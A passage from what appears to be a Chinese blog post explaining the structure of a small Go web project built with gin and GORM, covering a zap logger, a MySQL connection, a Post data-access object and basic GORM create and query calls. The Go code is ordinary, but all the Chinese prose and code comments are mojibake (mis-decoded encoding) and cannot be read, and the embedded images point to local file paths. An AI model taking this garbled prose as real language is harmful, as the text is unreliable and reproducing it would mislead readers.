<p>å®šä¹‰äº†ä¸‰ä¸ªè·¯ç”±ï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ªæµ‹è¯•è·¯ç”±ï¼Œä¸€ä¸ªè·å–é¡µé¢ï¼Œä¸€ä¸ªæ·»åŠ é¡µé¢çš„è·¯ç”±ï¼Œæ²¡æœ‰ä»€ä¹ˆå¾ˆéš¾ç†è§£çš„ï¼ŒInitåˆ™æ˜¯åˆå§‹åŒ–å„ç»„ä»¶ï¼Œå¹¶ä¸”å¦‚æœåˆå§‹åŒ–å¤±è´¥åˆ™ä¼šè¿”å›err</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å»çœ‹çœ‹utilï¼Œå‘ç°é‡Œé¢åªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œçœ‹åå­—å°±å¾ˆæµ…æ˜¾æ˜“æ‡‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;go.uber.org/zap&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Logger *zap.Logger</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitLogger</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	Logger, err = zap.NewProduction()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªæ—¥å¿—è®°å½•å™¨æ–¹ä¾¿ä½¿ç”¨ï¼Œä»¥æ–¹ä¾¿è°ƒè¯•</p>
<p>ç„¶åå°±æ˜¯çœ‹repositoryï¼Œè¿™ä¸ªåå­—ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä»“åº“å¯¹å§ï¼Œè¿™ä¹Ÿå°±æ˜¯å’Œæ•°æ®åº“æ‰“äº¤é“çš„åœ°æ–¹ï¼Œä¸“é—¨ç”¨äºæ“ä½œæ•°æ®åº“çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é¦–å…ˆçœ‹æ•°æ®åº“çš„åˆå§‹åŒ–</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> repository</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	dsn := <span class="string">&quot;root:root@tcp(127.0.0.1:3306)/community?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">	db, err = gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆç®€å•çš„ä¸€ä¸ªInitå‡½æ•°ï¼Œç”¨äºåˆå§‹åŒ–æ•°æ®åº“</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å¯¹åº”çš„ä¸‰ä¸ªæ–‡ä»¶åˆ†åˆ«å¯¹åº”æ•°æ®åº“ä¸­çš„ä¸‰ä¸ªè¡¨</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241110130119241.png" alt="image-20241110130119241"></p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241110130127895.png" alt="image-20241110130127895"></p>
<p>å¾ˆå®¹æ˜“çœ‹æ‡‚çš„ç»“æ„ä¹Ÿæ˜¯ï¼Œæˆ‘ä»¬å°±å¯¹æ­¤ï¼Œåˆ†æä¸€ä¸ªpostæ–‡ä»¶å§</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> repository</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="string">&quot;test01/server/util&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Post <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id         <span class="type">int64</span>     <span class="string">`gorm:&quot;column:id&quot;`</span></span><br><span class="line">	ParentId   <span class="type">int64</span>     <span class="string">`gorm:&quot;column:parent_id&quot;`</span></span><br><span class="line">	UserId     <span class="type">int64</span>     <span class="string">`gorm:&quot;column:user_id&quot;`</span></span><br><span class="line">	Content    <span class="type">string</span>    <span class="string">`gorm:&quot;column:content&quot;`</span></span><br><span class="line">	DiggCount  <span class="type">int64</span>     <span class="string">`gorm:&quot;column:digg_count&quot;`</span></span><br><span class="line">	CreateTime time.Time <span class="string">`gorm:&quot;column:create_time&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Post)</span></span> TableName() <span class="type">string</span> &#123; <span class="keyword">return</span> <span class="string">&quot;post&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PostDao <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> postDao *PostDao</span><br><span class="line"><span class="keyword">var</span> postOnce sync.Once</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewPostDaoInstance</span><span class="params">()</span></span> *PostDao &#123;</span><br><span class="line">	postOnce.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		postDao = &amp;PostDao&#123;&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">return</span> postDao</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*PostDao)</span></span> QueryPostById(id <span class="type">int64</span>) (*Post, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> post Post</span><br><span class="line">	err := db.Where(<span class="string">&quot;id=?&quot;</span>, id).Find(&amp;post).Error</span><br><span class="line">	<span class="keyword">if</span> err == gorm.ErrRecordNotFound &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Error(<span class="string">&quot;find post by id err:&quot;</span> + err.Error())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;post, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*PostDao)</span></span> QueryPostByParentId(parentId <span class="type">int64</span>) ([]*Post, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> posts []*Post</span><br><span class="line">	err := db.Where(<span class="string">&quot;parent_id = ?&quot;</span>, parentId).Find(&amp;posts).Error</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Error(<span class="string">&quot;find posts by parent_id err:&quot;</span> + err.Error())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> posts, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*PostDao)</span></span> CreatePost(post *Post) <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := db.Create(post).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		util.Logger.Error(<span class="string">&quot;create post err:&quot;</span> + err.Error())</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªPostç»“æ„ä½“å»å¯¹åº”ç€è¡¨ä¸­çš„åˆ—ï¼Œè¿™æ ·ä¹Ÿå°±å¯ä»¥æ›´å¥½çš„å»æ“ä½œæ•°æ®åº“</p>
<p>ç„¶åå°±æ˜¯é€šè¿‡å•ä¾‹æ¨¡å¼åˆ›å»ºå¯¹åº”çš„æ•°æ®åº“æ“ä½œå®ä¾‹ï¼Œä»è€Œé¿å…äº†èµ„æºçš„æµªè´¹ã€‚</p>
<p>ç„¶åå°±æ˜¯æ¥ä¸‹æ¥çš„ä¸‰ä¸ªæ–¹æ³•ï¼Œå°±æ˜¯QueryPostByIdé€šè¿‡idæŸ¥è¯¢Postè®°å½•</p>
<p>QueryPostByParentIdé€šè¿‡parentIdæŸ¥è¯¢å¤šæ¡postè®°å½•</p>
<p>CreatePostå°±æ˜¯åˆ›å»ºä¸€æ¡æ–°çš„post</p>
<p>è‡ªæ­¤ï¼Œæˆ‘ä»¬å°±å¤§æ¦‚äº†è§£äº†å¦‚ä½•é€šè¿‡goæ¡†æ¶å»æ“ä½œæ•°æ®åº“äº†</p>
<p>è¿™æ—¶å€™ä¹Ÿå°±å‰©ä¸‹äº†æœ€åä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œhandler</p>
<p>è¿™ä¹Ÿå°±æ˜¯å¤„ç†ç¨‹åºçš„æ–‡ä»¶å¤¹ï¼Œç”¨äºå¤„ç†å¯¹è·¯ç”±è®¿é—®çš„å¹¶ä¸”è¿”å›å¯¹åº”æ‰€éœ€ç»“æœçš„</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¯åŠ¨publish_postå°±æ˜¯å°†è¯·æ±‚çš„é˜Ÿå‹ç»“æœè¿”å›</p>
<p>è€Œquery_page_infoåˆ™æ˜¯å°†å¯¹åº”çš„å‘å¸ƒæ–‡ç« çš„è¯·æ±‚è¿›è¡Œå¤„ç†å¹¶è¿”å›å¯¹åº”ç»“æœã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬èƒ½å¤Ÿå‘ç°handlerä¸­çš„ä»£ç æ˜¯è°ƒç”¨äº†serviceå±‚çš„æ–¹æ³•çš„ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå°±å¯ä»¥å‰–ææ•´ä¸ªç¨‹åºçš„æµç¨‹äº†</p>
<p>server.goä¸­çš„è·¯ç”±â€”â€“&gt; handlerâ€”â€”&gt;serviceâ€”â€“&gt;repository</p>
<p>è¿™ä¹Ÿå°±æ˜¯æ•´ä¸ªè¯¥é¡¹ç›®çš„æµç¨‹äº†</p>
<p>ä¹Ÿå°±å’Œjavaå¾ˆåƒæ„Ÿè§‰ã€‚</p>
<p>æœ€åå°±æ˜¯å¯¹äºserviceå±‚çš„è®²è§£</p>
<p>è¿™é‡Œä¹Ÿå°±è¿˜æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¯¹åº”handlerä¸­çš„ä¸¤ä¸ªæ“ä½œ</p>
<p>ç”±serviceå±‚è°ƒç”¨æ•°æ®åº“æ“ä½œï¼Œä»è€Œè·å–åˆ°å¯¹åº”çš„æ•°æ®ï¼Œä»è€Œå°†å…¶èƒ½å¤Ÿå°†æ•°æ®è¿”å›ã€‚</p>
<p>è‡ªæ­¤ï¼Œè¿™ä¸ªå°é¡¹ç›®çš„ç»“æ„ä¹Ÿå°±æ˜äº†äº†ï¼Œè¿™ä¹Ÿèƒ½å¤Ÿæ›´åŠ æ–¹ä¾¿æˆ‘ä»¬ä¹‹åè‡ªå·±å»å¼€å‘é¡¹ç›®ï¼Œä¹Ÿè¦æœ‰ç€å¯¹åº”çš„ç»“æ„ï¼Œè¿™æ ·æ‰èƒ½æ›´å¥½çš„å»å¿«é€Ÿç¼–å†™å¯¹åº”çš„åŠŸèƒ½ã€‚</p>
<h2 id="3ã€é¡¹ç›®æ€»ç»“"><a href="#3ã€é¡¹ç›®æ€»ç»“" class="headerlink" title="3ã€é¡¹ç›®æ€»ç»“"></a>3ã€é¡¹ç›®æ€»ç»“</h2><p>æœ€åå°±æ˜¯å¯¹æ•´ä¸ªé¡¹ç›®çš„æ€»ç»“ï¼Œè¿™é‡Œæˆ‘ä»¬äº†è§£äº†ginæ¡†æ¶ï¼Œå¹¶ä¸”å®Œæˆäº†ç¬¬ä¸€ä¸ªgoè¯­è¨€é¡¹ç›®çš„ç¼–å†™ï¼Œæˆ‘ä»¬éœ€è¦è¯¦ç»†æ˜ç™½å¯¹åº”çš„é¡¹ç›®ç»“æ„ï¼Œæœ‰ç€æ¸…æ™°çš„é¡¹ç›®ç»“æ„ï¼Œæ‰èƒ½æ›´å¥½çš„ä¿éšœæˆ‘ä»¬ä»£ç çš„å¯è¯»æ€§ï¼Œè¿˜æ˜¯ginæ¡†æ¶ï¼Œæˆ‘æ„Ÿè§‰è¿˜æ˜¯ç®—æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä½†æ˜¯å¯¹äºå…¶æ“ä½œæ•°æ®åº“æ¥è¯´ï¼Œæˆ‘æ„Ÿè§‰ç¨å¾®æœ‰ç‚¹éº»çƒ¦ï¼Œæ¯•ç«Ÿå¯¹äºæ¯ä¸€ä¸ªè¡¨éƒ½éœ€è¦ä¸€ä¸ªgoæ–‡ä»¶ä¸å…¶å¯¹åº”æ‰èƒ½ä½¿ç”¨ï¼Œè¿™æ ·æ„Ÿè§‰æœ‰ç‚¹å•°å—¦äº†ã€‚å½“ç„¶ä¹Ÿä¸æ˜¯è¯´ä¸å¥½ï¼Œåªæ˜¯ä¸ªäººè¿™ä¹ˆæ„Ÿè§‰è€Œå·²ã€‚<br>æœ€åå°±æ˜¯ç±»æ¯”goè¯­è¨€å’Œjavaï¼Œæˆ‘æ„Ÿè§‰goè¯­è¨€ä¸­ç‰¹åˆ«å¤šçš„å°±æ˜¯å¯¹äºé”™è¯¯çš„å¤„ç†ï¼Œç»å¸¸éœ€è¦ä½¿ç”¨errå»æ¥å—é”™è¯¯ï¼Œå¹¶ä¸”å»åˆ¤æ–­é”™è¯¯ï¼Œä»¥åŠæ‰“å°ï¼Œè¿™ç‚¹ç¨å¾®æœ‰ç‚¹éº»çƒ¦ï¼Œä¸è¿‡ä¹Ÿæœ‰å¥½å¤„ï¼Œå°±æ˜¯èƒ½å¤Ÿå¿«æ·çš„æŒ‡å¯¼è‡ªå·±ä»£ç å“ªé‡Œæœ‰é”™è¯¯ä»€ä¹ˆçš„ï¼Œæ–¹ä¾¿å»è¿›è¡Œä¿®æ”¹ã€‚</p>
<h1 id="äºŒã€Gorm-Kitex-Hertzè®²è§£"><a href="#äºŒã€Gorm-Kitex-Hertzè®²è§£" class="headerlink" title="äºŒã€Gorm&#x2F;Kitex&#x2F;Hertzè®²è§£"></a>äºŒã€Gorm&#x2F;Kitex&#x2F;Hertzè®²è§£</h1><h2 id="1ã€Gormæ¡†æ¶"><a href="#1ã€Gormæ¡†æ¶" class="headerlink" title="1ã€Gormæ¡†æ¶"></a>1ã€Gormæ¡†æ¶</h2><p>è¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä¸Šé¢çš„å°é¡¹ç›®ä¸­æ‰€æ¶‰åŠä½¿ç”¨åˆ°çš„æ¡†æ¶ï¼Œæ˜¯ç”¨äºæ“ä½œæ•°æ®åº“çš„ä¸€ä¸ªæ¡†æ¶ã€‚</p>
<p>è¿™é‡Œé™„ä¸Šä¸€ä¸ªGORMæ¡†æ¶çš„ä¸­æ–‡æ–‡æ¡£<a href="https://gorm.io/zh_CN/docs/index.html">https://gorm.io/zh_CN/docs/index.html</a></p>
<p>å®‰è£…çš„è¯å°±ä¸è¿‡å¤šè®²äº†ï¼Œè‡ªå·±çœ‹æ–‡æ¡£éƒ½æ˜¯æœ‰çš„</p>
<h2 id="2ã€é“¾æ¥åˆå§‹åŒ–"><a href="#2ã€é“¾æ¥åˆå§‹åŒ–" class="headerlink" title="2ã€é“¾æ¥åˆå§‹åŒ–"></a>2ã€é“¾æ¥åˆå§‹åŒ–</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‚è€ƒ https://github.com/go-sql-driver/mysql#dsn-data-source-name è·å–è¯¦æƒ…</span></span><br><span class="line">dsn := <span class="string">&quot;user:pass@tcp(127.0.0.1:3306)/dbname?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è®¾ç½®dsnï¼Œå»æ‰“å¼€æ•°æ®åº“ï¼Œè€Œä¸”ä¹Ÿèƒ½å¤Ÿåœ¨åè¾¹å¯¹Configè¿›è¡Œç›¸åº”çš„æ•°æ®åº“è¿æ¥è®¾ç½®ã€‚(åŒ…æ‹¬ä¸€äº›åŸºæœ¬è®¾ç½®ï¼Œä»¥åŠå¯ä»¥è‡ªå®šä¹‰å¯¹åº”çš„æ•°æ®åº“é©±åŠ¨ç­‰ç­‰)</p>
<h2 id="3ã€CRUDæ¥å£"><a href="#3ã€CRUDæ¥å£" class="headerlink" title="3ã€CRUDæ¥å£"></a>3ã€CRUDæ¥å£</h2><p>å®Œæˆäº†ç®€å•çš„æ•°æ®åº“çš„åˆå§‹åŒ–ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹æ•°æ®åº“è¿›è¡Œå¯¹åº”çš„ä¸€ç³»åˆ—çš„æ“ä½œäº†ï¼ŒGormæ”¯æŒæ‰€æœ‰å¯¹æ•°æ®åº“çš„æ“ä½œï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå°±ä¸€ä¸€ç®€å•ä»‹ç»ä¸€ä¸‹ã€‚</p>
<h3 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h3><p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨Gormå¯¹äºæ•°æ®åº“çš„æ“ä½œï¼Œé’ˆå¯¹æ¯ä¸ªè¡¨ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æœ‰ä¸ªå¯¹åº”çš„æ¨¡å‹ç»“æ„ä½“å»å¯¹åº”æ•°æ®åº“çš„è¡¨ä»¥åŠå…¶ä¸­çš„å­—æ®µã€‚</p>
<p>é€šä¿—æ¥è¯´ï¼Œå°±æ˜¯å¯¹äºæ•°æ®åº“æ“ä½œä¸­ï¼Œæˆ‘ä»¬ä¹ æƒ¯æ€§åˆ›å»ºä¸€ä¸ªrepositoryæ–‡ä»¶å¤¹ï¼Œå¯åŠ¨æ”¾ç½®å¯¹åº”æ•°æ®åº“æœ‰å¤šå°‘è¡¨å°±æœ‰å¤šå°‘ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸€å¯¹åº”ç€æ“ä½œæ¯ä¸ªè¡¨ã€‚</p>
<p>å¹¶ä¸”æ¯ä¸ªæ–‡ä»¶ä¸­éƒ½è¦å®šä¹‰å¯¹åº”çš„ç»“æ„ä½“ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹å›¾æ‰€ç¤º</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gorm.Model çš„å®šä¹‰</span></span><br><span class="line"><span class="keyword">type</span> Model <span class="keyword">struct</span> &#123;</span><br><span class="line">  ID        <span class="type">uint</span>           <span class="string">`gorm:&quot;primaryKey&quot;`</span></span><br><span class="line">  CreatedAt time.Time</span><br><span class="line">  UpdatedAt time.Time</span><br><span class="line">  DeletedAt gorm.DeletedAt <span class="string">`gorm:&quot;index&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œæ³¨æ„ï¼Œå¦‚æœä¸ä½¿ç”¨<code>gorm:&quot;xxxx&quot;</code>å»å¯¹å­—æ®µè¿›è¡Œç”³æ˜ï¼Œç»“æ„ä½“å­—æ®µåç§°è½¬æ¢ä¸º <code>snake_case</code> ä½œä¸ºæ•°æ®åº“ä¸­çš„åˆ—å</p>
<p>ä»¥åŠå¯¹åº”è¡¨åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Tablenameæ–¹æ³•å»è®¾ç½®func (Post) TableName() string { return â€œpostâ€ }ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„æ‰€å¯¹åº”å‘½åï¼Œä¹Ÿå°±æ˜¯å°†ç»“æ„ä½“åç§°è½¬æ¢ä¸º <code>snake_case</code> å¹¶ä¸ºè¡¨ååŠ ä¸Šå¤æ•°å½¢å¼ã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸ª <code>User</code> ç»“æ„ä½“åœ¨æ•°æ®åº“ä¸­çš„è¡¨åå˜ä¸º <code>users</code></p>
</blockquote>
<p>å¹¶ä¸”ä½¿ç”¨Gormæ¡†æ¶çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜èƒ½å»åŒ…å«ä¸€äº›ç‰¹å®šçš„å­—æ®µï¼Œå®ç°æ›´å¥½çš„åŠŸèƒ½</p>
<ul>
<li><code>ID</code> ï¼šæ¯ä¸ªè®°å½•çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆä¸»é”®ï¼‰ã€‚</li>
<li><code>CreatedAt</code> ï¼šåœ¨åˆ›å»ºè®°å½•æ—¶è‡ªåŠ¨è®¾ç½®ä¸ºå½“å‰æ—¶é—´ã€‚</li>
<li><code>UpdatedAt</code>ï¼šæ¯å½“è®°å½•æ›´æ–°æ—¶ï¼Œè‡ªåŠ¨æ›´æ–°ä¸ºå½“å‰æ—¶é—´ã€‚</li>
<li><code>DeletedAt</code>ï¼šç”¨äºè½¯åˆ é™¤ï¼ˆå°†è®°å½•æ ‡è®°ä¸ºå·²åˆ é™¤ï¼Œè€Œå®é™…ä¸Šå¹¶æœªä»æ•°æ®åº“ä¸­åˆ é™¤ï¼‰ã€‚</li>
</ul>
<p>åŸºç¡€ä½¿ç”¨çš„è¯è¿™äº›å·²ç»è¶³å¤Ÿäº†ï¼Œè‡³äºæ›´åŠ é«˜çº§çš„ï¼Œå°±å¯ä»¥å»è‡ªå·±æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£å³å¯ã€‚</p>
<h3 id="1ã€åˆ›å»º"><a href="#1ã€åˆ›å»º" class="headerlink" title="1ã€åˆ›å»º"></a>1ã€åˆ›å»º</h3><p>ç›´æ¥ä½¿ç”¨ä¸Šé¢è¿”å›çš„æ•°æ®åº“ï¼Œä½¿ç”¨ç»“æ„ä½“çš„æŒ‡é’ˆæ–¹å¼å»åˆ›å»ºå¯¹åº”çš„æ•°æ® </p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">user := User&#123;Name: <span class="string">&quot;Jinzhu&quot;</span>, Age: <span class="number">18</span>, Birthday: time.Now()&#125;</span><br><span class="line">result := db.Create(&amp;user) <span class="comment">// é€šè¿‡æ•°æ®çš„æŒ‡é’ˆæ¥åˆ›å»º</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œä¸€å®šè¦æ³¨æ„ï¼Œä¼ å…¥çš„æ˜¯ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè€Œä¸æ˜¯å•çº¯çš„ç»“æ„ä½“</p>
</blockquote>
<p>ç”¨ç€æŒ‡å®šçš„å­—æ®µåˆ›å»ºè®°å½•</p>
<blockquote>
<p>åˆ›å»ºè®°å½•å¹¶ä¸ºæŒ‡å®šå­—æ®µèµ‹å€¼ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Select(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;Age&quot;</span>, <span class="string">&quot;CreatedAt&quot;</span>).Create(&amp;user)</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºè®°å½•å¹¶å¿½ç•¥ä¼ é€’ç»™ â€˜Omitâ€™ çš„å­—æ®µå€¼</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Omit(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;Age&quot;</span>, <span class="string">&quot;CreatedAt&quot;</span>).Create(&amp;user)</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="æ‰¹é‡æ’å…¥"><a href="#æ‰¹é‡æ’å…¥" class="headerlink" title="æ‰¹é‡æ’å…¥"></a>æ‰¹é‡æ’å…¥</h4><p>è¿™é‡Œæ‰¹é‡æ’å…¥æˆ‘ä»¬ä½¿ç”¨ä¼ å…¥ä¸€ä¸ªåˆ‡ç‰‡å»å®Œæˆï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨mapå»åˆ›å»ºä¹Ÿæ˜¯å¯ä»¥çš„</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> users = []User&#123;&#123;Name: <span class="string">&quot;jinzhu1&quot;</span>&#125;, &#123;Name: <span class="string">&quot;jinzhu2&quot;</span>&#125;, &#123;Name: <span class="string">&quot;jinzhu3&quot;</span>&#125;&#125;</span><br><span class="line">db.Create(&amp;users)</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Model(&amp;User&#123;&#125;).Create(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">  <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;jinzhu&quot;</span>, <span class="string">&quot;Age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="2ã€æŸ¥è¯¢"><a href="#2ã€æŸ¥è¯¢" class="headerlink" title="2ã€æŸ¥è¯¢"></a>2ã€æŸ¥è¯¢</h3><p>GORM æä¾›äº† <code>First</code>ã€<code>Take</code>ã€<code>Last</code> æ–¹æ³•ï¼Œä»¥ä¾¿ä»æ•°æ®åº“ä¸­æ£€ç´¢å•ä¸ªå¯¹è±¡ã€‚å½“æŸ¥è¯¢æ•°æ®åº“æ—¶å®ƒæ·»åŠ äº† <code>LIMIT 1</code> æ¡ä»¶ï¼Œä¸”æ²¡æœ‰æ‰¾åˆ°è®°å½•æ—¶ï¼Œå®ƒä¼šè¿”å› <code>ErrRecordNotFound</code> é”™è¯¯</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241112174939548.png" alt="image-20241112174939548"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">å¦‚æœä½ æƒ³é¿å…ErrRecordNotFoundé”™è¯¯ï¼Œä½ å¯ä»¥ä½¿ç”¨Findï¼Œæ¯”å¦‚db.Limit(<span class="number">1</span>).Find(&amp;user)ï¼ŒFindæ–¹æ³•å¯ä»¥æ¥å—<span class="keyword">struct</span>å’Œsliceçš„æ•°æ®ã€‚</span><br><span class="line">å»ºè®®å°±æ˜¯å°½é‡ä½¿ç”¨findè€Œä¸æ˜¯firstä»¥é¿å…å‡ºç°ä¸€äº›é”™è¯¯ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="æ ¹æ®ä¸»é”®æ£€ç´¢"><a href="#æ ¹æ®ä¸»é”®æ£€ç´¢" class="headerlink" title="æ ¹æ®ä¸»é”®æ£€ç´¢"></a>æ ¹æ®ä¸»é”®æ£€ç´¢</h4><p>å¦‚æœä¸»é”®æ˜¯æ•°å­—ç±»å‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://gorm.io/zh_CN/docs/query.html#inline_conditions">å†…è”æ¡ä»¶</a> æ¥æ£€ç´¢å¯¹è±¡ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.First(&amp;user, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 10;</span></span><br><span class="line">db.First(&amp;user, <span class="string">&quot;10&quot;</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 10;</span></span><br><span class="line">db.Find(&amp;users, []<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id IN (1,2,3);</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸»é”®æ˜¯å­—ç¬¦ä¸²(ä¾‹å¦‚åƒuuidè¿™ç§)ï¼ŒæŸ¥è¯¢å°†ä¼šè¢«å†™æˆå¦‚ä¸‹</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.First(&amp;user, <span class="string">&quot;id = ?&quot;</span>, <span class="string">&quot;1b74413f-f3b8-409f-ac47-e8c062e3472a&quot;</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = &quot;1b74413f-f3b8-409f-ac47-e8c062e3472a&quot;;</span></span><br></pre></td></tr></table></figure>

